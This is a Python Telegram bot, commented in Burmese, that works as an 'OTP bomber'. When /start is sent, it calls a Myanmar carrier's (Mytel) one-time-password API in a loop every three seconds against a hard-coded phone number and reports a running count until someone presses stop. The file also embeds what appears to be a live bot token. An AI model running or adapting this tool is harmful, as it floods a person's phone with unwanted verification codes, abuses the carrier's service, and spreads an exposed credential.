import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
import requests

TOKEN = "8183997269:AAElovxXFRd40oatzEtSnKpVm8UAheNvAQw"
DEFAULT_PHONE = "09663976639"

# Mytel OTP API ကိုခေါ်မည့် Function (အောင်မြင်မှု ရှိမရှိ စစ်ဆေးခြင်း)
def get_otp_from_api(phone_number):
    url = f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={phone_number}"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            return "အောင်မြင်သည် (Success)"
        else:
            return f"မအောင်မြင်ပါ (Code: {response.status_code})"
    except Exception as e:
        return f"အမှား: {str(e)}"

# Bot စတင်ချိန်နှင့် /start ခေါ်လိုက်ချိန်တွင် Unknown နံပါတ်အတွက် အလိုအလျောက် အလုပ်လုပ်မည့် Task
async def start_default_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # တစ်ခါမှ မစတင်ရသေးရင် သို့မဟုတ် အသစ်စတင်ချင်ရင်
    keyboard = [[InlineKeyboardButton("🛑 ရပ်တန့်ရန်", callback_data="stop_unknown")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    msg = await update.message.reply_text(
        f"🚀 **OTP Bomber အလုပ်လုပ်နေဆဲ...**\n\n"
        f"📱 ဖုန်း: `unknown`\n"
        f"🔄 ပို့ပြီးစီးမှု: `0` ကြိမ်",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

    # ဤ chat_id အတွက် stop flag ကို False လုပ်မည်
    context.user_data['stop_unknown'] = False
    i = 0
    delay_seconds = 3

    while not context.user_data.get('stop_unknown', False):
        i += 1
        result = await asyncio.to_thread(get_otp_from_api, DEFAULT_PHONE)
        
        try:
            await msg.edit_text(
                f"🚀 **OTP Bomber အလုပ်လုပ်နေဆဲ...**\n\n"
                f"📱 ဖုန်း: `unknown`\n"
                f"🔄 ပို့ပြီးစီးမှု: `{i}` ကြိမ်\n"
                f"📡 အခြေအနေ: `{result}`",
                parse_mode="Markdown",
                reply_markup=reply_markup
            )
        except Exception:
            pass

        # ၃ စက္ကန့် စောင့်နေစဉ်အတွင်း ရပ်တန့်ရန် ခလုတ်နှိပ်ထားခြင်း ရှိမရှိ စစ်ဆေးခြင်း
        for _ in range(delay_seconds):
            if context.user_data.get('stop_unknown', False):
                break
            await asyncio.sleep(1)

    try:
        await msg.edit_text(
            f"🛑 **OTP Bomber ရပ်တန့်သွားပါပြီ။**\n\n"
            f"📱 ဖုန်း: `unknown`\n"
            f"✨ စုစုပေါင်း: `{i}` ကြိမ်",
            parse_mode="Markdown"
        )
    except Exception:
        pass

# ရပ်တန့်ရန် ခလုတ်နှိပ်သည့်အခါ
async def stop_button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer("ရပ်တန့်လိုက်ပါပြီ!")
    if query.data == "stop_unknown":
        context.user_data['stop_unknown'] = True

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start_default_bomber))
    app.add_handler(CallbackQueryHandler(stop_button_click, pattern="stop_unknown", block=False))

    print("Bot အလုပ်လုပ်နေပါပြီ...")
    app.run_polling()
